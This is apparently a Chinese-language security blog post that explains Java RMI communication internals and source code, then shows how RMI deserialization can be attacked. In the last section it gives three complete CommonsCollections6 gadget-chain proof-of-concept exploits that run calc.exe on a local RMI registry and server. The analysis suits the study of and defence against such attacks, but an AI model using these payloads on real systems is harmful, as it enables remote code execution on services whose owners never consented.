# JAVA RMI

Java RMI：Java 远程方法调用，即 Java RMI（Java Remote Method Invocation）是 Java 编程语言里，一种用于实现远程过程调用的应用程序编程接口。

<img src="https://gitee.com/ling-x5/img/raw/master/image-20250303205421620.png" alt="image-20250303205421620" style="zoom: 67%;" />

## 通信机制

要了解通信机制，我们先来了解几个核心概念

1. **Stub（客户端代理）**：客户端的本地代理，将方法调用转换为网络请求并处理返回结果。
2. **Skeleton（服务端代理）**：服务端的接收者，解析请求并调用实际远程对象的方法。
3. **RemoteRef（远程引用层）**：管理远程对象的引用和通信细节。
4. **RemoteCall（远程调用对象）**：封装远程调用的传输内容，负责网络数据交换。

**具体流程：**

1. **初始化**
   * **服务端注册远程对象**：服务端创建对象实例（继承 `java.rmi.Remote`），通过 `Naming.rebind()` 或 `Registry.bind()` 将远程对象绑定至 RMI 注册表（Registry），注册表默认监听端口 1099
   * **客户端获取远程引用**：客户端调用 `Naming.lookup("rmi://host:port/service")`，触发 RMI 注册表查询。注册表返回远程对象的 **Stub**（动态生成的代理类，`RegistryImpl_Stub`），Stub 封装了远程对象的方法元数据和网络地址。
2. **远程方法调用**
   * **Stub 发起调用**：客户端调用 Stub 的远程方法，Stub 委托 `RemoteRef`（远程引用层，如 `UnicastRef`）构建 **RemoteCall** 对象（包括：目标方法的方法名，参数类型和 **序列化后的方法参数**）。
   * **传输**：`RemoteRef` 通过 Socket 连接将 RemoteCall 的序列化字节流发送至服务端。

3. **服务端处理**
   * **Skeleton 处理请求**：服务端 `RemoteRef`（如 `UnicastServerRef`）接收字节流，**第一次反序列化**（<span style="color:#FF0000;"> 解析字节流的协议头部 </span>，确定目标对象标识符（ObjID）和操作类型）后生成 RemoteCall 对象。将 RemoteCall 传递给对应的 **Skeleton**（如 `RegistryImpl_Skel`）。Skeleton 通过 `dispatch()` 方法进行 **二次反序列化**（<span style="color:#FF0000;"> 按协议规范逐层解析字节流 </span>）解析请求类型（如 `bind`、`list`、`lookup`、`rebind`、`unbind` 或方法调用）
   * **反射执行真实方法**：Skeleton 从 RemoteCall 中提取方法签名和参数，通过 Java 反射机制调用服务端实现类的对应方法。

4. **结果返回**
   * **序列化与回传**：服务端将方法执行结果（或异常）序列化，封装为新的 RemoteCall 对象，通过 Socket 连接将结果字节流返回客户端。
   * **客户端反序列化**：客户端 `RemoteRef` 接收字节流，反序列化为 Java 对象。==若结果为远程对象引用（如另一服务的 Stub），客户端后续通过该 Stub 发起嵌套调用。==

### 概括

整个 RMI 通信过程可以概括为：客户端调用 Stub  =>  Stub 打包消息  =>  Stub 发送消息  =>  服务端 Skeleton 接收消息  =>  Skeleton 解包消息  =>  Skeleton 调用远程对象  =>  远程对象执行方法  =>  远程对象返回结果  =>  Skeleton 打包结果  =>  Skeleton 发送结果  =>  客户端 Stub 接收结果  =>  Stub 解包结果  =>  客户端获得最终结果。

让我们一个简单的调用示例

## RMI 代码示例

添加 `commons-collections` 依赖：

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

1. 定义远程接口（必须继承 `Remote`）

```java
package com.lingx5;
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Calculator extends Remote {
    int add(int a, int b) throws RemoteException;  // 所有方法必须声明抛出RemoteException
}
```

2. 定义接口实现

```java
package com.lingx5;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RMIimpl extends UnicastRemoteObject implements Calculator {
    private static final long serialVersionUID = 1L;

    protected RMIimpl() throws RemoteException {
        super();
    }


    @Override
    public int add(int a, int b) throws RemoteException {
        return a+b;
    }
}
```

3. RMIServer 实现

```java
package com.lingx5.RMI;

import com.lingx5.Caculatorimpl;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * RMI服务启动类
 * 该类的主要作用是初始化RMI注册表，并绑定一个计算器服务实现
 */
public class RMIServer {
    /**
     * 主函数
     * 尝试创建并启动RMI注册表，然后绑定计算器服务实现
     * @param args 命令行参数
     */
    public static void main(String[] args) {
        try {
            // 创建计算器服务实现实例
            Caculatorimpl caculator = new Caculatorimpl();
            // 创建RMI注册表，监听端口为1099
            Registry registry = LocateRegistry.createRegistry(1099);
            // 在注册表中绑定计算器服务实现，供远程调用
            registry.rebind("caculator", caculator);

            // 打印服务启动成功信息和RMI注册地址
            System.out.println("RMI服务已启动");
            System.out.println("RMI注册地址: rmi://127.0.0.1:1099/caculator");
        } catch (Exception e) {
            // 打印异常信息
            System.out.println(e.getMessage());
        }
    }
}
```

4. RMIClient 实现

```java
package com.lingx5.RMI;

import com.lingx5.Calculator;

import java.rmi.Naming;

/**
 * RMI客户端主类
 * 该类包含主方法，用于演示如何通过RMI调用远程计算器服务
 */
public class RMIClient {

    /**
     * 主方法
     * 尝试查找并连接到远程计算器服务，然后调用加法方法
     * @param args 命令行参数，未使用
     */
    public static void main(String[] args) {
        try {
            // 通过RMI URL查找远程计算器对象
            Calculator calculator = (Calculator) Naming.lookup("rmi://127.0.0.1:1099/caculator");

            // 调用远程计算器对象的加法方法，并接收结果
            int res = calculator.add(12, 34);

            // 打印加法方法的结果
            System.out.println(res);
        } catch (Exception e) {
            // 捕获并打印异常信息
            System.out.println(e.getMessage());
        }
    }
}
```

运行一下，看看结果

启动服务

![image-20250302134216520](https://gitee.com/ling-x5/img/raw/master/image-20250302134216520.png)

客户端，成功获取到 Calculator 接口，并执行 add()方法

![image-20250302134310493](https://gitee.com/ling-x5/img/raw/master/image-20250302134310493.png)

## 源码分析

### RMIServer 服务端

#### 远程调用类初始化调用栈

> Caculatorimpl caculator = new Caculatorimpl(); 让我们看看它做了哪些事情

![image-20250304144318799](https://gitee.com/ling-x5/img/raw/master/image-20250304144318799.png)

其实在这里，我们可以再 **上图中** 看出在 Caculatorimpl 实例化的时候就已经把远程服务发部出去了，不过服务端创建的随机的端口，我们客户端并找不到具体的远程服务。这是就需要借助和注册中心绑定来实现客户端远程访问。

接着

创建完成之后，服务对象（Caculatorimpl）封装进一个 `Target` 后调用 exportObject() 导出，接着 put 进 ObjectTable 全局对象表中，但是在添加到 ObjectTable 全局对象表之前，要先创建 DGC 服务对象，这也正是 putTarget 中的逻辑。==DGC 是 RMI 的基础设施，必须在其他远程对象导出前完成初始化。==

![image-20250304183056867](https://gitee.com/ling-x5/img/raw/master/image-20250304183056867.png)

接着还会进行 DGCImpl 的初始化，从上图调用栈的后续栈中也可以看出 `<clinit>276, DGCImpl(sun.rmi.transport)`。主要原因是：在执行 sun.rmi.transport.ObjectTable#putTarget 时会用到 DGCImpl 的静态方法，而 jvm 在首次加载 DGCImpl 类时，DGCImpl 类的静态代码块自动执行。

![image-20250304183745301](https://gitee.com/ling-x5/img/raw/master/image-20250304183745301.png)

**DGCImpl 的静态代码块**

```java
static {
    leaseCheckInterval = (Long)AccessController.doPrivileged(new GetLongAction("sun.rmi.dgc.checkInterval", leaseValue / 2L));
    scheduler = ((RuntimeUtil)AccessController.doPrivileged(new RuntimeUtil.GetInstanceAction())).getScheduler();
    AccessController.doPrivileged(new PrivilegedAction<Void>() {
        public Void run() {
            ClassLoader var1 = Thread.currentThread().getContextClassLoader();

            try {
                Thread.currentThread().setContextClassLoader(ClassLoader.getSystemClassLoader());

                try {
                    DGCImpl.dgc = new DGCImpl();
                    ObjID var2 = new ObjID(2);
                    LiveRef var3 = new LiveRef(var2, 0);
                    UnicastServerRef var4 = new UnicastServerRef(var3);
                    Remote var5 = Util.createProxy(DGCImpl.class, new UnicastRef(var3), true);
                    var4.setSkeleton(DGCImpl.dgc);
                    Target var6 = new Target(DGCImpl.dgc, var4, var5, var2, true);
                    ObjectTable.putTarget(var6);
                } catch (RemoteException var10) {
                    throw new Error("exception initializing server-side DGC", var10);
                }
            } finally {
                Thread.currentThread().setContextClassLoader(var1);
            }

            return null;
        }
    });
}
```

可以看到在 11-19 行，完成了 DGCImpl 的初始化，并封装进了 Target 类中，最后 ObjectTable.putTarget(var6); 添加到了全局对象表中。

封装的 Target 对象（DGCImpl）

![image-20250304191849954](https://gitee.com/ling-x5/img/raw/master/image-20250304191849954.png)

看得出来这个 DGCImpl 有 **存根 DGCImpl_Stub** 和 **骨架 DGCImpl_Skel**，这也就意味着 DGCImpl 可以被客户端远程调用并且可以解析客户端调用。二者共同实现了 DGC 服务的透明远程调用，完成 RMI 分布式垃圾回收机制。

#### 注册中心调用栈

> Registry registry = LocateRegistry.createRegistry(1099);
>
> 注册中心创建了 RemoteStub（sun.rmi.registry.RegistryImpl_Stub）和 Skeleton（sun.rmi.registry.RegistryImpl_Skel）

* 创建 RemoteStub 的调用栈

![image-20250304164356539](https://gitee.com/ling-x5/img/raw/master/image-20250304164356539.png)

* 创建 Skeleton 的调用栈

![image-20250304161436781](https://gitee.com/ling-x5/img/raw/master/image-20250304161436781.png)

- 创建 Socket 服务开启监听调用栈

![image-20250304194802400](https://gitee.com/ling-x5/img/raw/master/image-20250304194802400.png)

#### rebind 调用栈

> registry.rebind("caculator", caculator); 这是服务类启动的最后一步

![image-20250304195351238](https://gitee.com/ling-x5/img/raw/master/image-20250304195351238.png)

就是把名称和远程对象的 **隐式存根序列化形式**（Caculatorimpl_Stub）**绑定到注册表中**

> - **远程对象自身**（如 `Caculatorimpl`）的核心职责是实现业务逻辑，而非处理网络通信细节。直接继承 `UnicastRemoteObject` 的导出机制仅负责将对象暴露为远程服务（隐式生成 Stub），但自身不需要直接持有 Stub。
> - **注册中心**（Registry）的职责是管理远程对象的引用。由于注册中心本身也是一个远程服务，它需要显式生成 `RemoteStub`（如 `RegistryImpl_Stub`）来处理客户端的 `lookup` 等操作请求。
> - **调用 bind**：仅是将 Caculatorimpl 隐式生成的 Stub 传给注册中心，而非是 Caculatorimpl 本身示例

### RMIClient 客户端

#### 获得 CalculatorImpl_Stub 存根



>  Calculator calculator = (Calculator) Naming.lookup("rmi://127.0.0.1:1099/caculator");

获取注册中心的客户端代理(Registry_Stub)

我们看到会想 client 客户端应该是通过反序列化读取得到 RegistryImpl_Stub 对象的。**但是**，实际上并不是反序列化获得的，而是 client 通过传递的参数在自己本地创建了一个一模一样的 RegistryImpl_Stub 来进行通信的

##### Naming

![image-20250304204655507](https://gitee.com/ling-x5/img/raw/master/image-20250304204655507.png)

获得 RegistryImpl_Stub 后，接着执行 java.rmi.registry.Registry#lookup 的逻辑

##### lookup

![image-20250304205342317](https://gitee.com/ling-x5/img/raw/master/image-20250304205342317.png)

```java
public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
    try {
        /*
        super.ref：表示客户端与注册表服务的远程引用（RemoteRef）。
		newCall：创建一个远程调用（RemoteCall）对象，准备向注册表发送请求。
		参数 2 表示调用注册表服务的第 2 个方法（即 lookup 方法）。
        */
        RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);

        try {
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(var1);   // 序列化服务名称（如 "Calculator"）
        } catch (IOException var18) {
            throw new MarshalException("error marshalling arguments", var18);
        }

        super.ref.invoke(var2);  // 向注册表发送请求

        Remote var23;
        try {
            ObjectInput var6 = var2.getInputStream();
            var23 = (Remote)var6.readObject();    // 反序列化得到远程对象存根 Calculator_Stub
        } catch (IOException var15) {
            throw new UnmarshalException("error unmarshalling return", var15);
        } catch (ClassNotFoundException var16) {
            throw new UnmarshalException("error unmarshalling return", var16);
        } finally {
            super.ref.done(var2);   
        }

        return var23;
    } catch (RuntimeException var19) {
        throw var19;
    } catch (RemoteException var20) {
        throw var20;
    } catch (NotBoundException var21) {
        throw var21;
    } catch (Exception var22) {
        throw new UnexpectedException("undeclared checked exception", var22);
    }
}
```

其实我们可以看主要逻辑：

```java
/*
super.ref：表示客户端与注册表服务的远程引用（RemoteRef）。
newCall：创建一个远程调用（RemoteCall）对象，准备向注册表发送请求。
参数 2 表示调用注册表服务的第 2 个方法（即 lookup 方法）。
*/
RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);

ObjectOutput var3 = var2.getOutputStream();
var3.writeObject(var1);   // 序列化服务名称（Calculator）

super.ref.invoke(var2);  // 向注册表发送请求

ObjectInput var6 = var2.getInputStream();
var23 = (Remote)var6.readObject();    // 反序列化得到远程对象存根 Calculator_Stub
super.ref.done(var2); // 释放调用资源
return var23; // 返回远程对象存根
```

在主要逻辑的 14 行，我们看到获得远程对象存根（Calculator_Stub）时，进行了反序列化。

> 很显然这是不安全的，如果有一个恶意的注册中心绑定了一个恶意的类，那么当客户端获得远程对象存根时，很可能就会遭受攻击

super.ref.invoke(var2);  // 向注册表发送请求 ，那请求时具体是怎么发送的呢？

##### invoke

我们进行跟进 invoke 方法，因为版本不支持调试，我们可以用到调试小技巧。

我们右键 => 复制 => 复制引用。粘贴出来这样就可以知道具体是走到哪个类了。

![image-20250304213308187](https://gitee.com/ling-x5/img/raw/master/image-20250304213308187.png)

java.rmi.server.RemoteRef#invoke(java.rmi.server.RemoteCall)

然后看他的实现方法

![image-20250305090101384](https://gitee.com/ling-x5/img/raw/master/image-20250305090101384.png)

下断点，发现它断在了 sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)

![image-20250305090220374](https://gitee.com/ling-x5/img/raw/master/image-20250305090220374.png)

会调到 sun.rmi.transport.StreamRemoteCall#executeCall，而这个 executeCall 就是处理网络请求的方法。通过观察它的变量也不难看出。

![image-20250305090757127](https://gitee.com/ling-x5/img/raw/master/image-20250305090757127.png)

我们把这个 sun.rmi.transport.StreamRemoteCall#executeCall 代码拿出来分析一下。

```java
/**
 * 执行调用操作，负责处理数据传输和响应码验证
 * 
 * 此方法的主要职责包括：
 * 1. 从输出流获取确认处理器（DGCAckHandler）
 * 2. 释放输出流(发送数据)并准备读取输入流
 * 3. 验证传输返回码和处理返回数据
 * 4. 处理异常情况，包括传输返回码无效和数据反序列化错误
 * 
 * @throws Exception 如果在执行调用过程中遇到错误，将抛出异常
 */
public void executeCall() throws Exception {
    DGCAckHandler var2 = null;

    byte var1;
    try {
        // 检查输出流是否为空，如果不为空，则获取其确认处理器
        if (this.out != null) {
            var2 = this.out.getDGCAckHandler();
        }

        /* 
        还记得我们在java.rmi.registry.Registry#lookup中invoke方法之前的逻辑吗？
        ObjectOutput var3 = var2.getOutputStream();
		var3.writeObject(var1);   // 序列化服务名称（Calculator）
		数据的实际网络发送（从缓冲区到服务器），通过 releaseOutputStream() 的 this.out.flush() 实现。
        */
        this.releaseOutputStream();
        // 创建数据输入流以读取连接的输入流
        DataInputStream var3 = new DataInputStream(this.conn.getInputStream());
        // 读取并验证传输返回码，在 RMI 协议中，81 是传输层成功的返回码。如果不是 81，则记录日志并抛出
        byte var4 = var3.readByte();
        if (var4 != 81) {
            // 如果传输返回码无效，记录日志并抛出异常
            if (Transport.transportLog.isLoggable(Log.BRIEF)) {
                Transport.transportLog.log(Log.BRIEF, "transport return code invalid: " + var4);
            }

            throw new UnmarshalException("Transport return code invalid");
        }

        // 获取输入流并读取数据
        this.getInputStream();
        var1 = this.in.readByte();
        this.in.readID();
    } catch (UnmarshalException var11) {
        // 处理数据反序列化异常
        throw var11;
    } catch (IOException var12) {
        // 处理I/O异常，包装为UnmarshalException
        throw new UnmarshalException("Error unmarshaling return header", var12);
    } finally {
        // 确保在最后释放确认处理器
        if (var2 != null) {
            var2.release();
        }
    }

    // 根据读取的字节值执行相应的操作
    switch (var1) {
        case 1:    // var1 为 1，表示服务器成功执行了方法且无异常。
            return;
        case 2:    // var1 为 2，表示服务器抛出了异常。
            Object var14;
            try {
                // 这里抛出异常后，他对异常进行了反序列化。这里也有可能成为被攻击的点。
                var14 = this.in.readObject();
            } catch (Exception var10) {
                // 处理反序列化错误
                throw new UnmarshalException("Error unmarshaling return", var10);
            }

            // 验证返回对象的类型
            if (!(var14 instanceof Exception)) {
                throw new UnmarshalException("Return type not Exception");
            } else {
                // 处理从服务器接收到的异常
                this.exceptionReceivedFromServer((Exception)var14);
            }
        default:
            // 如果返回码无效，记录日志并抛出异常
            if (Transport.transportLog.isLoggable(Log.BRIEF)) {
                Transport.transportLog.log(Log.BRIEF, "return code invalid: " + var1);
            }

            throw new UnmarshalException("Return code invalid");
    }
}
```

我们在服务端的 sun.rmi.registry.RegistryImpl#lookup 打个断点，当我们在执行到 sun.rmi.transport.StreamRemoteCall#releaseOutputStream 时，点击下一步会跳转到服务端的断点处。

客户端发送

![image-20250305132123995](https://gitee.com/ling-x5/img/raw/master/image-20250305132123995.png)

服务的处理请求的调用栈

![image-20250305132925833](https://gitee.com/ling-x5/img/raw/master/image-20250305132925833.png)

服务端整体处理请求的流程我们从调用栈的分析，也大致可以看出来：

```
TCP 连接接收 (TCPTransport$AcceptLoop) =>
TCP 连接处理 (TCPTransport$ConnectionHandler) =>
RMI 传输层消息处理 (Transport.handleMessages => Transport.serviceCall) =>
远程调用执行 (StreamRemoteCall.executeCall) =>
服务端引用分发 (UnicastServerRef.dispatch => UnicastServerRef.oldDispatch) =>
Registry 骨架分发 (RegistryImpl_Skel.dispatch) =>
Registry 业务逻辑执行 (RegistryImpl.lookup)
```

##### 总结一下

在 RegistryImpl_Skel.dispatch 中，操作码及对应关系

- 0 -> bind
- 1 -> list
- 2 -> lookup
- 3 -> rebind
- 4 -> unbind

简单的梳理一下客户端的逻辑

1. Naming 在执行中显示在本地，通过 ip，端口等参数创建了一个注册中心的存根（RegistryImpl_Stub）对象

2. `java.rmi.registry.Registry#lookup` 通过 ==ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(var1);   // 序列化服务名称（Calculator）== 把要请求的存根名称写进缓冲区，后执行 `sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)` => `sun.rmi.transport.StreamRemoteCall#executeCall` 这个 executeCall 方法，执行了 `this.releaseOutputStream();` 把数据的实际网络发送（从缓冲区到服务器）。然后 executeCall 对响应的正确性做了校验，并把 `this.in` 指向响应主体的起始位置。最后 sun.rmi.server.UnicastRef#invoke 的后续逻辑 ==ObjectInput var6 = var2.getInputStream(); var23 = (Remote)var6.readObject();    // 反序列化得到远程对象存根 Calculator_Stub==，最终反序列化得到存根对象。

#### 客户端通信

> int res = calculator.add(12, 34);

这里我放入普通类型发现调试不了（应该是 jdk 版本的问题）。

我有写一个传入字符串的方法，调试。我把代码改为了

```java
package com.lingx5.RMI;
import com.lingx5.Calculator;
import java.rmi.Naming;
public class RMIClient {
    public static void main(String[] args) {
        try {
            // 通过RMI URL查找远程计算器对象
            Calculator calculator = (Calculator) Naming.lookup("rmi://127.0.0.1:1099/caculator");
            System.out.println(calculator.sayHello("lingx5"));
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }
}
```

我们跟入一下首先步入 我们来到了 java.rmi.server.RemoteObjectInvocationHandler#invoke 这个方法。

看具的内容，看到我们获取的 calculator，实际上就是一个 Proxy 对象，也就是隐式的存根 Stub。所以会调用到 RemoteObjectInvocationHandler 的 invoke 方法

![image-20250305161850904](https://gitee.com/ling-x5/img/raw/master/image-20250305161850904.png)

我们就行跟如会来到反序列化的地方 sun.rmi.server.UnicastRef#marshalValue

![image-20250305162826442](https://gitee.com/ling-x5/img/raw/master/image-20250305162826442.png)

var0 是我们传入变量的类型，var1 是我们传入变量的值“lingx5”，在这个方法中直接 var2.writeObject(var1)，把我们的参数序列化传给服务端了

![image-20250305163004293](https://gitee.com/ling-x5/img/raw/master/image-20250305163004293.png)

他还是会走 sun.rmi.transport.StreamRemoteCall#executeCall 这个方法。

var49.executeCall(); 发送请求。和之前的请求远程对象存根（CalculatorImpl_Stub ）是很相似的

![image-20250305163425845](https://gitee.com/ling-x5/img/raw/master/image-20250305163425845.png)

服务端拦截请求

![image-20250305155048303](https://gitee.com/ling-x5/img/raw/master/image-20250305155048303.png)

服务端在处理请求时，会调用到 sun.rmi.server.UnicastRef#unmarshalValue 这个方法，反序列化我们的参数

![image-20250305170034930](https://gitee.com/ling-x5/img/raw/master/image-20250305170034930.png)

跟进来看到 return var1.readObject()的值就是我们传入的参数

![image-20250305170148011](https://gitee.com/ling-x5/img/raw/master/image-20250305170148011.png)

之后，就是客户端拿到返回结果在就行反序列化了。

##### 我们大概的梳理一下

客户端调用链条

```
calculator.sayHello("lingx5") => Calculator_Stub.sayHello(String name) => 
java.rmi.server.RemoteObjectInvocationHandler#invoke => sun.rmi.server.UnicastRef#marshalValue 序列化
=> sun.rmi.transport.StreamRemoteCall#executeCall 发送请求
底层就是Transport负责socket网络通信
sun.rmi.transport.Transport.invoke(RemoteCall call)  =>  sun.rmi.transport.Transport.doCall(RemoteCall call)  =>  java.net.Socket.getOutputStream()  =>  java.io.ObjectOutputStream.writeObject() (序列化并发送数据)
```

服务端处理链条

```
TCP 连接接收 (TCPTransport$AcceptLoop)  =>  TCP 连接处理 (TCPTransport$ConnectionHandler)  =>  RMI 传输层消息处理 (Transport.handleMessages => Transport.serviceCall)  =>  远程调用执行 (StreamRemoteCall.executeCall)
=> sun.rmi.server.UnicastServerRef#oldDispatch => sun.rmi.server.UnicastServerRef#dispatch  =>  Calculator_Skel.dispatch 将参数反序列化 => CalculatorImpl.sayHello(String name)返回结果 => Calculator_Skel.dispatch 序列化结果 => StreamRemoteCall.executeCall 发送给客户端
```

客户端在反序列化输出结果

## 反序列化攻击

我们从源码分析已经知道了，主要的反序列化攻击点有

1. 服务端向注册中心发送绑定请求是，注册中心会反序列化远程对象，绑定到 bandings 表中
2. 客户端请求 Caculator_Stub 时，会把请求得到的 Stub 对象反序列化
3. 客户端向服务端发送参数时，服务端会就行反序列化拿到参数
4. 服务端把返回结果传给客户端时，客户端会反序列化结果

我们利用 CommonsCollections6 来编写 poc

### 客户端攻击注册中心（服务端）

因为在高版本的 jdk 中，会强制把注册中心和服务端绑定到一台机器上。只是利用的阶段会有所差异，攻击注册中心主要是在服务端绑定远程服务已经客户端查找远程服务时。主要利用的就是 sun.rmi.registry.RegistryImpl_Stub 和 sun.rmi.registry.RegistryImpl_Skele 类的通信逻辑

```java
package com.lingx5.RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;

public class expRegisterServer {
    protected expRegisterServer() throws RemoteException {
    }

    public static void main(String[] args) throws Exception {
        // 创建Transform数组，构造CC6链条
        Transformer[] transforms = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        LazyMap lazyMap = (LazyMap)LazyMap.decorate(new HashMap(),new ConstantTransformer(null));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"lingx5");
        HashMap<Object, Object> HashMap = new HashMap<>();
        HashMap.put(tiedMapEntry,"lingx5");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);
        lazyMap.remove("lingx5");
        // 反射创建代理
        Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(java.lang.annotation.Retention.class, HashMap);
        Remote remote = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));
        Registry registry = LocateRegistry.createRegistry(1099);
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry_remote.bind("exp",remote);
    }
}
```

![image-20250307090808244](https://gitee.com/ling-x5/img/raw/master/image-20250307090808244.png)

当然我们同样也可发送其他的请求来攻击注册中心

在 sun.rmi.registry.RegistryImpl_Skele 的请求处理中 case2 就代表了 lookup 方法，也是直接进行了 var98 = (String)var104.readObject(); 反序列化操作

![image-20250307103319437](https://gitee.com/ling-x5/img/raw/master/image-20250307103319437.png)

但是，lookup 方法只有一个字符串的参数，我们要怎么把恶意的类给传输过去呢? 其实这个问题我们可以通过反射的方式，把恶意的类的序列化数据先写进输入流，当 RegistryImpl_Skele 执行到 case 2 反序列化逻辑的时候触发

照着 sun.rmi.registry.RegistryImpl_Stub#lookup 请求的逻辑，我们编写利用

![image-20250307121518409](https://gitee.com/ling-x5/img/raw/master/image-20250307121518409.png)

```java
package com.lingx5.RMI;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.util.HashMap;

public class expLookup {
    public static void main(String[] args) throws Exception{
        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(),new ConstantTransformer(null));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"lingx5");
        HashMap<Object, Object> HashMap = new HashMap<>();
        HashMap.put(tiedMapEntry,"lingx5");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);
        lazyMap.remove("lingx5");
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        constructor.newInstance(java.lang.annotation.Retention.class,HashMap);
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        // 获取super.ref registry_remote为RegistryImpl_Stub对象，直接父类是RemoteStub，而ref实在RemoteStub的父类RemoteObject中定义的
        Field ref = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
        ref.setAccessible(true);
        UnicastRef remoteRefe = (UnicastRef) ref.get(registry_remote);
        Field declaredField = registry_remote.getClass().getDeclaredFields()[0];
        declaredField.setAccessible(true);
        Operation[] operations = (Operation[]) declaredField.get(registry_remote);

        // 跟着lookup的逻辑，执行newCall方法，2代表lookup方法
        RemoteCall remoteCall = remoteRefe.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
        // 写入序列化的恶意代码
        ObjectOutput outputStream = remoteCall.getOutputStream();
        outputStream.writeObject(HashMap);
        remoteRefe.invoke(remoteCall);
    }
}
```

![image-20250307120932661](https://gitee.com/ling-x5/img/raw/master/image-20250307120932661.png)

### 客户端攻击服务端

这个就是在客户端调用远程服务时，客户端的代理 Stub 序列化参数，再由服务端的 Skele 进行反序列化，造成的攻击场景

我们需要为远程接口提供一个接受 Object 对象的接口方法

![image-20250307123833882](https://gitee.com/ling-x5/img/raw/master/image-20250307123833882.png)

启动服务

![image-20250307123918890](https://gitee.com/ling-x5/img/raw/master/image-20250307123918890.png)

编写客户端的 payload，把恶意的对象传进去就可以，这个比较简单

```java
package com.lingx5.RMI;

import com.lingx5.Calculator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;

public class c2sExp {
    public static void main(String[] args) throws Exception{
        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(),new ConstantTransformer(null));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"lingx5");
        HashMap<Object, Object> HashMap = new HashMap<>();
        HashMap.put(tiedMapEntry,"lingx5");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);
        lazyMap.remove("lingx5");
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        Calculator calculator = (Calculator) registry_remote.lookup("caculator");
        calculator.sayGood(HashMap);

    }
}
```

![image-20250307123658676](https://gitee.com/ling-x5/img/raw/master/image-20250307123658676.png)

